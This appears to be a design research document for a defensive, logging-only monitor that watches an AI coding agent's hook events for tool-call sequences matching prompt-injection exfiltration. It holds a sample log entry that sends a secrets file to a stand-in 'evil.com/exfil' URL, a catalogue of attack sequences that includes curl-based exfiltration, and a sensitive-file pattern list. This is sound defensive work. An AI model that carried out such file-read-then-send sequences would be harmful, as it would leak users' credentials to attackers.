# Phase 7: Tool Call Monitoring — Research

**Researched:** 2026-03-12
**Domain:** Behavioral anomaly detection at the agent hook layer (Python, in-process)
**Confidence:** HIGH

---

<phase_requirements>
## Phase Requirements

| ID | Description | Research Support |
|----|-------------|-----------------|
| TCM-01 | Implement tool call behavioral monitoring at hook layer (CaMeL-lite) | Monitor integrates into existing PreToolUse/PostToolUse handlers; in-memory sequence ring buffer keyed on session_id; fires on known anomalous sequences (file read → network call); logs structured events for analyst reconstruction; adds zero blocking latency (async log path only) |
</phase_requirements>

---

## Summary

CloneGuard already intercepts every tool call through the Claude Code hook protocol. The PreToolUse and PostToolUse hooks receive `session_id`, `tool_name`, `tool_input`, `tool_use_id`, and event metadata on stdin as JSON. What they do not currently do is observe the *sequence* of tool calls within a session. Phase 7 adds a lightweight in-process behavioral monitor that records what tool calls have occurred, in what order, and flags sequences consistent with prompt-injection-driven lateral movement or exfiltration.

The design constraint is critical: the monitor must not add blocking latency to the hot path. The existing Tier 0+1.5 pipeline is already budgeted at 25ms p95. The solution is to make the monitor a *logging-only* side effect — it records events and emits warnings, but never blocks. Blocking decisions remain the responsibility of the existing Tier 0/1.5 content scanners. The monitor adds observability, not a new enforcement layer.

The "CaMeL-lite" framing from the requirements refers to the spirit of CaMeL (arXiv:2503.18813) — information flow awareness — applied at the hook boundary without the full dual-LLM taint tracking architecture. CaMeL proper requires deep inference-layer integration; CaMeL-lite means: track what tools are called, with what arguments, in what sequence, and flag when observed sequences match known-bad patterns (file read → WebFetch to novel domain, Bash pipe to external URL following file read, repeated MCP tool invocations with escalating data payloads, etc.).

**Primary recommendation:** Implement `ToolCallMonitor` as a module-level singleton in `hooks.py` (or a new `monitor.py`). It maintains a per-session deque of recent tool events, applies a small set of sequence rules on each new event, and writes structured JSON log entries to `~/.cloneguard/monitor.log`. No blocking; zero hot-path latency added.

---

## Standard Stack

### Core

| Library | Version | Purpose | Why Standard |
|---------|---------|---------|--------------|
| `collections.deque` | stdlib | Per-session ring buffer of recent tool events | O(1) append/pop, bounded memory, no deps |
| `json` | stdlib | Structured log serialization | Already used throughout codebase |
| `datetime` | stdlib | ISO 8601 timestamps in log entries | Standard for analyst-readable logs |
| `pathlib.Path` | stdlib | Log file path resolution | Already used in codebase |
| `dataclasses` | stdlib | ToolEvent and SequenceAlert data types | Consistent with PatternMatch/ScanResult style |

### Supporting

| Library | Version | Purpose | When to Use |
|---------|---------|---------|-------------|
| `threading.Lock` | stdlib | Thread-safe access to session map | If hook ever called from multiple threads (defensive) |
| `re` | stdlib | URL/domain extraction from tool arguments | Already used; extract destination from WebFetch/Bash curl |

### Alternatives Considered

| Instead of | Could Use | Tradeoff |
|------------|-----------|----------|
| In-process deque | External Redis/SQLite | External adds dependency, latency, failure mode; in-process is simpler and correct for per-session state |
| JSON log file | Structured syslog | syslog is harder to parse for security analysts; JSON JSONL is grep-able and readable |
| Rule-based sequences | ML anomaly detection | ML requires training data; rule-based is auditable, explainable, and zero-latency |

**Installation:** No new dependencies. Pure stdlib.

---

## Architecture Patterns

### Recommended Module Structure

```
src/cloneguard/
├── hooks.py           # Existing — add monitor integration calls
├── monitor.py         # NEW — ToolCallMonitor class + sequence rules
└── ...
tests/
├── test_hooks.py      # Existing — add integration smoke tests
└── test_monitor.py    # NEW — unit tests for ToolCallMonitor
```

The monitor lives in `monitor.py` to keep `hooks.py` focused. `hooks.py` calls `monitor.record_event(data)` at the top of each handler before doing content scanning — the record call must be non-blocking (never raises, never writes to stdout).

### Pattern 1: Module-Level Singleton with Per-Session Ring Buffer

**What:** A single `ToolCallMonitor` instance lives in process memory (like `_engine`). It holds a `dict[str, deque[ToolEvent]]` keyed on `session_id`. Each deque is capped at `maxlen=50` to bound memory.

**When to use:** Always. One monitor per process; one deque per session.

```python
# Source: design — stdlib only
from __future__ import annotations
import json
import time
from collections import deque
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

_MAX_SESSION_EVENTS = 50   # ring buffer depth per session
_MAX_SESSIONS = 200        # evict LRU sessions beyond this

@dataclass
class ToolEvent:
    session_id: str
    tool_use_id: str
    tool_name: str
    tool_input: dict[str, Any]
    hook_event_name: str   # "PreToolUse" or "PostToolUse"
    ts: float = field(default_factory=time.monotonic)

@dataclass
class SequenceAlert:
    rule_id: str
    description: str
    session_id: str
    trigger_event: ToolEvent
    context_window: list[ToolEvent]  # recent events that pattern matched over
```

### Pattern 2: Non-Blocking Record-and-Check

**What:** `record_event()` appends to the deque, runs rules synchronously (rules are O(N) where N ≤ 50), emits log entry if alert fires. Never blocks on I/O — log writes go to a buffered file opened in append mode.

**When to use:** Called from the top of `handle_pre_tool_use` and `handle_post_tool_use` before any content scanning.

```python
# Source: design
def record_event(self, data: dict[str, Any]) -> None:
    """Record a hook event. Never raises; never writes to stdout."""
    try:
        session_id = data.get("session_id", "<unknown>")
        event = ToolEvent(
            session_id=session_id,
            tool_use_id=data.get("tool_use_id", ""),
            tool_name=data.get("tool_name", ""),
            tool_input=data.get("tool_input", {}),
            hook_event_name=data.get("hook_event_name", data.get("hook_type", "")),
        )
        # Append to session ring buffer
        buf = self._sessions.setdefault(session_id, deque(maxlen=_MAX_SESSION_EVENTS))
        buf.append(event)
        # Run sequence rules; emit alert if matched
        alerts = self._check_rules(session_id, buf, event)
        for alert in alerts:
            self._log_alert(alert)
    except Exception:
        pass  # Monitor MUST NOT raise into the hot path
```

### Pattern 3: Sequence Rules as Named Functions

**What:** Each sequence rule is a function `(session_id, buf, trigger_event) -> SequenceAlert | None`. Rules are stored in a list. Adding a new rule = adding a function and registering it.

**When to use:** For every anomalous sequence pattern (see Anomalous Sequence Catalogue below).

```python
# Source: design
_RULES: list[Callable[[str, deque[ToolEvent], ToolEvent], SequenceAlert | None]] = []

def _rule(fn):
    """Decorator: register a function as a sequence rule."""
    _RULES.append(fn)
    return fn

@_rule
def _file_read_then_network(
    session_id: str,
    buf: deque[ToolEvent],
    trigger: ToolEvent,
) -> SequenceAlert | None:
    """Flag: file read immediately followed by WebFetch/Bash curl to novel domain."""
    ...
```

### Pattern 4: Structured JSONL Log

**What:** Each alert is written as one JSON object per line to `~/.cloneguard/monitor.log`. The log is append-only and readable with `jq`.

**When to use:** Always; this is the primary analyst artifact.

```python
# Source: design — output format for analyst consumption
{
    "ts": "2026-03-12T15:04:05.123Z",
    "rule_id": "SEQ-001",
    "description": "File read followed by WebFetch to novel domain",
    "session_id": "abc123",
    "trigger": {
        "tool_name": "WebFetch",
        "tool_use_id": "toolu_01...",
        "url": "https://evil.com/exfil"
    },
    "context": [
        {"tool_name": "Read", "file_path": "/project/secrets.env"},
        {"tool_name": "WebFetch", "url": "https://evil.com/exfil"}
    ]
}
```

### Anti-Patterns to Avoid

- **Writing to stdout in record_event:** stdout is the hook communication channel. Monitor output must go to log file only.
- **Blocking on log file I/O:** Open the log file once at monitor init in append+buffered mode. Don't open/close per event.
- **Raising exceptions from record_event:** A monitor failure must never block an agent tool call. Wrap entirely in try/except.
- **Blocking the hook for any sequence match:** TCM-01 requires "does not add blocking latency above 25ms." Sequence alerts are observational, never blocking.
- **Storing full tool_response in the ring buffer:** tool_response can be large (file contents). Store only tool_name, tool_input, tool_use_id, ts.

---

## Anomalous Sequence Catalogue

These are the known-bad sequences to implement as rules. Each maps to a real attack class documented in the literature.

| Rule ID | Pattern | Attack Class | Source |
|---------|---------|-------------|--------|
| SEQ-001 | Read(file) → WebFetch(external_url) within N events | Log-To-Leak exfiltration | arXiv:2506.01055, arXiv:2602.20720 |
| SEQ-002 | Read(file) → Bash(curl/wget to external URL) within N events | Curl-based exfiltration | EX-001 pattern class |
| SEQ-003 | mcp__*__* called >K times in M events (frequency spike) | Repeated MCP tool abuse (AdapTools stealthy tool) | arXiv:2602.20720 |
| SEQ-004 | Write(sensitive_target) → Bash(build_cmd) within N events | Supply chain poisoning via write-then-build | PAT-01 build script patterns |
| SEQ-005 | Any tool called with novel external domain not seen in session startup phase | Novel C2 destination | CaMeL capability tracking concept |

**Implementation priority:** SEQ-001 and SEQ-002 are highest value (directly address Log-To-Leak Gap 5 from prior research). SEQ-003 addresses AdapTools stealthy tool class. SEQ-004 is a bonus that connects to existing Tier 0 build command gating. SEQ-005 is MEDIUM complexity (requires session-startup domain baseline) and can be deferred if time-constrained.

### Rule Tuning Notes

- **N (look-back window):** Default 10 events. Configurable. Too small = misses fragmented sequences; too large = false positives.
- **K (MCP frequency threshold for SEQ-003):** Default 5 calls to same MCP tool within last 10 events. Adjust based on FPR measurement.
- **"Novel external domain" (SEQ-001/002/005):** A domain not in a known-safe list. Safe list = localhost, 127.0.0.1, ::1, and any domains seen in the first 5 tool calls of the session (when the agent is doing legitimate setup). This is a heuristic; false positive risk is real for development workflows that legitimately call external APIs.

---

## Don't Hand-Roll

| Problem | Don't Build | Use Instead | Why |
|---------|-------------|-------------|-----|
| Sequence matching | Custom state machine | List of rule functions over a deque | State machines are harder to test and extend; rule functions are independently testable |
| Log rotation | Custom rotate-by-size | Python's `logging.handlers.RotatingFileHandler` | Handles rotation, permissions, edge cases |
| Timestamp generation | Custom | `datetime.now(timezone.utc).isoformat()` | ISO 8601, tz-aware, stdlib |
| Domain extraction from URLs | Custom regex | `urllib.parse.urlparse(url).netloc` | RFC 3986 compliant, stdlib, handles edge cases |

**Key insight:** The monitor is not a detection system — it is an *observation* system. The temptation to make it block tool calls based on sequences should be resisted. Blocking based on sequences requires a precision that the current rule set cannot provide (FPR risk). Observability is the correct design contract for this phase.

---

## Common Pitfalls

### Pitfall 1: stdout Contamination

**What goes wrong:** `record_event` or `_log_alert` accidentally writes to stdout. Claude Code reads stdout from hooks for decision-making. Any unexpected output on stdout will be interpreted as a hook response and may cause errors or incorrect behavior.

**Why it happens:** Developers add debug prints to the monitor during development and forget to remove them. Or a log write falls back to stdout.

**How to avoid:** The log file must be opened explicitly at monitor init. All monitor output goes to the file. Never `print()` from monitor code. Tests should assert stdout is empty after monitor calls.

**Warning signs:** Integration tests showing unexpected hook output; Claude Code reporting "unexpected hook response format."

### Pitfall 2: Blocking Latency from Log I/O

**What goes wrong:** Each call to `record_event` opens and closes the log file, or waits for a flush. With many tool calls per session, this adds measurable latency.

**Why it happens:** Naive implementation does `open(..., 'a').write(...)` per event.

**How to avoid:** Open the log file once in `__init__` (or lazily on first write) in append mode. Hold the file handle open for the process lifetime. Use line-buffering (`buffering=1` for text mode) so each `\n`-terminated line flushes automatically without an explicit `flush()` call. The OS handles the actual disk write asynchronously.

**Warning signs:** Latency tests showing >5ms added from monitor calls.

### Pitfall 3: Memory Growth from Unbounded Session Map

**What goes wrong:** Long-running Claude Code sessions with many sub-sessions accumulate entries in `_sessions`. Each entry is a deque of up to 50 ToolEvent objects. With 200+ sessions, this becomes significant.

**Why it happens:** Session IDs are never evicted from the map.

**How to avoid:** Cap at `_MAX_SESSIONS = 200`. When the map exceeds this, evict the oldest-accessed sessions (use an `OrderedDict` or implement simple LRU). In practice, a single developer machine will rarely have >10 concurrent sessions.

**Warning signs:** Memory growth over time in long Claude Code sessions.

### Pitfall 4: False Positives on Legitimate Workflows

**What goes wrong:** SEQ-001 (file read → WebFetch) fires constantly for legitimate workflows where the agent reads a config file and then fetches documentation.

**Why it happens:** The pattern is too broad. "Read any file, then make any web request" describes half of all legitimate agent workflows.

**How to avoid:** Narrow the rule. SEQ-001 should only fire when:
1. The file read is of a sensitive type (`.env`, credentials, `~/.ssh/`, etc.), OR
2. The WebFetch destination is a domain not seen in the session startup window AND is not in a known-safe domain list.
3. The two events occur within a short time window (e.g., within 5 intervening tool calls, not just 50).

**Warning signs:** Monitor log fills up with SEQ-001 alerts on normal usage.

### Pitfall 5: hook_type vs. hook_event_name Field Name

**What goes wrong:** The Claude Code protocol uses `hook_event_name` in the hook payload (per official docs), but the existing `hooks.py` code reads `hook_type` (line 465). The monitor must tolerate both field names since legacy hook configs may send either.

**Why it happens:** The field was renamed in a Claude Code update. The existing codebase already uses `hook_type` for the dispatcher but the official docs spec shows `hook_event_name`. Both should be handled.

**How to avoid:** `data.get("hook_event_name", data.get("hook_type", ""))` — as shown in the code example above. Tests should cover both field name variants.

**Warning signs:** Monitor receives events with empty `hook_event_name`.

---

## Code Examples

### Extracting External URL from Tool Input

```python
# Source: stdlib urllib.parse + design
from urllib.parse import urlparse

_SAFE_HOSTS = frozenset({"localhost", "127.0.0.1", "::1", "0.0.0.0"})

def _extract_external_url(tool_name: str, tool_input: dict) -> str | None:
    """Return the destination URL if the tool call targets an external host."""
    url: str | None = None
    if tool_name == "WebFetch":
        url = tool_input.get("url", "")
    elif tool_name == "Bash":
        # Heuristic: extract first https?:// URL in the command string
        import re
        m = re.search(r"https?://[^\s'\"]+", tool_input.get("command", ""))
        url = m.group(0) if m else None
    if not url:
        return None
    host = urlparse(url).hostname or ""
    return url if host not in _SAFE_HOSTS else None
```

### SEQ-001 Rule Implementation Sketch

```python
# Source: design
@_rule
def _file_read_then_network(
    session_id: str,
    buf: deque[ToolEvent],
    trigger: ToolEvent,
) -> SequenceAlert | None:
    """SEQ-001: Sensitive file read followed by external network call."""
    if trigger.tool_name not in ("WebFetch", "Bash"):
        return None
    ext_url = _extract_external_url(trigger.tool_name, trigger.tool_input)
    if not ext_url:
        return None
    # Scan look-back window for a recent sensitive file read
    recent = list(buf)[-10:]  # last 10 events including trigger
    for event in reversed(recent[:-1]):  # exclude trigger itself
        if event.tool_name == "Read":
            fp = event.tool_input.get("file_path", "")
            if _is_sensitive_file(fp):
                return SequenceAlert(
                    rule_id="SEQ-001",
                    description=f"Sensitive file read ({fp!r}) followed by external network call ({ext_url!r})",
                    session_id=session_id,
                    trigger_event=trigger,
                    context_window=recent,
                )
    return None

def _is_sensitive_file(file_path: str) -> bool:
    """Heuristic: is this a file that could contain credentials or PII?"""
    fp = file_path.lower()
    sensitive_patterns = (".env", "secret", "credential", "password", "token", "key", ".ssh/", "id_rsa", "id_ed25519")
    return any(p in fp for p in sensitive_patterns)
```

### Monitor Integration in hooks.py

```python
# Source: design — integration points in hooks.py
from cloneguard.monitor import get_monitor   # module-level singleton accessor

def handle_pre_tool_use(data: dict[str, Any]) -> int:
    # Monitor call: non-blocking, no stdout, never raises
    get_monitor().record_event(data)
    # ... existing content scanning logic unchanged ...

def handle_post_tool_use(data: dict[str, Any]) -> int:
    get_monitor().record_event(data)
    # ... existing content scanning logic unchanged ...
```

### Structured Log Entry

```python
# Source: design — JSONL format for analyst consumption
import json
from datetime import datetime, timezone

def _log_alert(self, alert: SequenceAlert) -> None:
    entry = {
        "ts": datetime.now(timezone.utc).isoformat(),
        "rule_id": alert.rule_id,
        "description": alert.description,
        "session_id": alert.session_id,
        "trigger": {
            "tool_name": alert.trigger_event.tool_name,
            "tool_use_id": alert.trigger_event.tool_use_id,
            "tool_input_summary": _summarize_input(alert.trigger_event),
        },
        "context_window": [
            {
                "tool_name": e.tool_name,
                "tool_use_id": e.tool_use_id,
                "tool_input_summary": _summarize_input(e),
            }
            for e in alert.context_window
        ],
    }
    self._log_fh.write(json.dumps(entry) + "\n")
    # line-buffered; \n triggers flush automatically
```

---

## Hook Protocol Facts (Verified from Official Docs)

These facts are verified against the Claude Code hooks reference at code.claude.com/docs/en/hooks (fetched 2026-03-12):

| Fact | Value | Confidence |
|------|-------|------------|
| `session_id` field | Present in all hook events (common input field) | HIGH |
| `tool_use_id` field | Present in PreToolUse and PostToolUse | HIGH |
| `tool_name` field | Present in PreToolUse and PostToolUse | HIGH |
| `tool_input` field | Present in both; schema varies by tool | HIGH |
| `tool_response` field | PostToolUse only (called `tool_response` in official docs, `tool_output` in existing CloneGuard code — verify at runtime) | MEDIUM — note discrepancy |
| PostToolUse exit 2 | Does NOT block; shows stderr to Claude only | HIGH |
| PreToolUse exit 2 | Blocks the tool call | HIGH |
| MCP tool names | Format: `mcp__<server>__<tool>` | HIGH |
| Hook timeout (command) | Default 600s; `hooks.json` currently sets 10-30s | HIGH |

**CRITICAL NOTE on `tool_output` vs `tool_response`:** The existing `hooks.py` reads `data.get("tool_output", {})` in `handle_post_tool_use`. The official Claude Code docs show the PostToolUse payload field as `tool_response`. The monitor should use `data.get("tool_response", data.get("tool_output", {}))` for forward compatibility. This is a pre-existing discrepancy in `hooks.py` that may need a separate fix.

---

## Latency Budget Analysis

The phase requirement states the monitor must not add blocking latency above the 25ms p95 budget. Here is the breakdown:

| Operation | Expected latency | Justification |
|-----------|-----------------|---------------|
| Deque append (1 ToolEvent) | <1 µs | O(1), in-memory |
| Rule evaluation over 10-event window | <100 µs | 5 rules × O(10) each = O(50) total; pure Python dict/string ops |
| JSONL log write (line-buffered) | <1 µs | OS kernel buffers the write; physical disk I/O is async |
| Total monitor overhead | <0.5 ms | Well within budget |

The existing Tier 0 PatternEngine scan is ~5ms and Tier 1.5 ONNX is ~16ms p95 (per test_latency.py). The monitor adds less than 0.5ms. Budget headroom is 25ms - 21ms ≈ 4ms; monitor uses at most 0.5ms of that.

---

## State of the Art

| Old Approach | Current Approach | When Changed | Impact |
|--------------|------------------|--------------|--------|
| Content-only scanning (Tier 0+1.5) | Content scanning + sequence monitoring | Phase 7 | Closes Gap 5 (behavioral pattern detection) identified in v0.4 direction research |
| CaMeL full taint tracking | CaMeL-lite: rule-based sequence detection at hook layer | 2025-present | Full CaMeL requires inference-layer integration; hook-layer approximation achieves partial coverage without platform changes |

**Deprecated/outdated:**
- Full CaMeL taint tracking at this layer: requires dual-LLM architecture or model activation access — not feasible from external hooks. The "CaMeL-lite" label is intentional; it makes no claim of equivalence with arXiv:2503.18813 coverage.

---

## Open Questions

1. **`tool_output` vs `tool_response` discrepancy**
   - What we know: `hooks.py` uses `tool_output`; official docs show `tool_response`. Both work because the hook reads whichever field is present.
   - What's unclear: Whether Claude Code sends one or both field names. Could be `tool_response` in new versions, `tool_output` in older configs.
   - Recommendation: Fix `hooks.py` to use `data.get("tool_response", data.get("tool_output", {}))` as part of this phase (low-risk defensive fix).

2. **Log file location and permissions**
   - What we know: `~/.cloneguard/` is an existing CloneGuard state directory (used by trust_cache).
   - What's unclear: Whether the directory always exists at hook invocation time.
   - Recommendation: `Path("~/.cloneguard/monitor.log").expanduser().parent.mkdir(parents=True, exist_ok=True)` in monitor `__init__`.

3. **False positive rate for SEQ-001/002 on developer workflows**
   - What we know: Legitimate agent workflows frequently do file reads followed by web requests (read README → fetch dependency docs). The narrowing heuristics (sensitive file names + novel domain) reduce but do not eliminate FPR.
   - What's unclear: Actual FPR on real developer sessions. No corpus exists.
   - Recommendation: Log-only (no blocking) design makes FPR acceptable for this phase. Document that the monitor is observation-only; FPR measurement deferred to post-v0.4 validation.

4. **`hook_type` deprecation in Claude Code protocol**
   - What we know: Existing `hooks.py` uses `data.get("hook_type", "")` as the dispatch field. Official docs show `hook_event_name`. The existing code works, suggesting Claude Code sends both or the dispatcher is not failing.
   - What's unclear: Whether a future Claude Code update will drop `hook_type` entirely.
   - Recommendation: The monitor should use `hook_event_name` with fallback to `hook_type`. Log a debug-level warning if only `hook_type` is found (signals a version compatibility issue).

---

## Validation Architecture

### Test Framework

| Property | Value |
|----------|-------|
| Framework | pytest (pyproject.toml: `testpaths = ["tests"]`) |
| Config file | `pyproject.toml` — `[tool.pytest.ini_options]` |
| Quick run command | `uv run pytest tests/test_monitor.py -x -q` |
| Full suite command | `uv run pytest tests/ -x -q` |

### Phase Requirements → Test Map

| Req ID | Behavior | Test Type | Automated Command | File Exists? |
|--------|----------|-----------|-------------------|-------------|
| TCM-01a | SEQ-001 fires on Read(sensitive file) → WebFetch(external URL) | unit | `uv run pytest tests/test_monitor.py::TestSequenceRules::test_seq001_fires -x` | ❌ Wave 0 |
| TCM-01b | SEQ-002 fires on Read(sensitive file) → Bash(curl external URL) | unit | `uv run pytest tests/test_monitor.py::TestSequenceRules::test_seq002_fires -x` | ❌ Wave 0 |
| TCM-01c | SEQ-003 fires on repeated MCP tool invocations (>5 in 10 events) | unit | `uv run pytest tests/test_monitor.py::TestSequenceRules::test_seq003_mcp_frequency -x` | ❌ Wave 0 |
| TCM-01d | Monitor does not add blocking latency (record_event < 5ms per call) | unit | `uv run pytest tests/test_monitor.py::TestMonitorLatency -x` | ❌ Wave 0 |
| TCM-01e | No output on stdout from record_event (stdout clean assertion) | unit | `uv run pytest tests/test_monitor.py::TestMonitorNoBleeding -x` | ❌ Wave 0 |
| TCM-01f | Log entry contains session_id, rule_id, trigger, context_window | unit | `uv run pytest tests/test_monitor.py::TestLogStructure -x` | ❌ Wave 0 |
| TCM-01g | Monitor integrates into handle_pre_tool_use and handle_post_tool_use | integration | `uv run pytest tests/test_hooks.py -x -q` | ✅ (extend existing) |
| TCM-01h | All 1,159 existing tests pass with monitor integrated | regression | `uv run pytest tests/ -q` | ✅ |

### Sampling Rate

- **Per task commit:** `uv run pytest tests/test_monitor.py -x -q`
- **Per wave merge:** `uv run pytest tests/ -x -q`
- **Phase gate:** Full suite green before `/gsd:verify-work`

### Wave 0 Gaps

- [ ] `tests/test_monitor.py` — covers TCM-01a through TCM-01f (new file)
- [ ] `src/cloneguard/monitor.py` — new module (Wave 0 scaffold)
- [ ] Monitor integration calls in `hooks.py` handle_pre_tool_use and handle_post_tool_use
- [ ] `~/.cloneguard/` directory creation in monitor `__init__`

---

## Sources

### Primary (HIGH confidence)

- Claude Code Hooks Reference (code.claude.com/docs/en/hooks, fetched 2026-03-12) — PreToolUse/PostToolUse input schemas, common fields (session_id, tool_use_id), exit code behavior, MCP tool naming convention
- `src/cloneguard/hooks.py` (project codebase) — existing handler structure, singleton pattern, stdout conventions, _session_trust pattern
- `tests/test_latency.py` (project codebase) — 25ms p95 budget, skip-on-CI pattern, latency measurement methodology
- `docs/research/v04-direction-research-2026-03-10.md` (project) — CaMeL-lite framing, tool call monitoring scope, defense boundary

### Secondary (MEDIUM confidence)

- `docs/sub-agents/log-to-leak-research.md` (project) — Gap 5 (behavioral pattern detection), anomalous sequence catalogue, attack classes (SEQ-001 through SEQ-005), false positive analysis
- arXiv:2503.18813 Debenedetti et al. (CaMeL) — dual-LLM taint tracking architecture; confirms hook-layer approximation is "CaMeL-lite" not full CaMeL
- arXiv:2602.20720 Wang et al. (AdapTools) — stealthy tool selection, repeated MCP invocation patterns (SEQ-003)
- arXiv:2506.01055 Alizadeh et al. — file-read-to-exfiltration ASR ~20% (validates SEQ-001 attack class)

### Tertiary (LOW confidence)

- Simon Willison (2025-04) commentary on CaMeL — "99% ML detection is useless for security" framing; log-only design aligns with this

---

## Metadata

**Confidence breakdown:**
- Hook protocol field schema: HIGH — verified against official docs fetched 2026-03-12
- Monitor architecture: HIGH — pure stdlib, consistent with existing codebase patterns
- Sequence rules (anomalous patterns): MEDIUM — validated against literature but FPR on real workflows unknown
- Latency estimate (<0.5ms): HIGH — O(50) Python dict/string ops; consistent with known performance characteristics

**Research date:** 2026-03-12
**Valid until:** 2026-06-12 (90 days — stable stdlib patterns; Claude Code hook protocol schema may change)
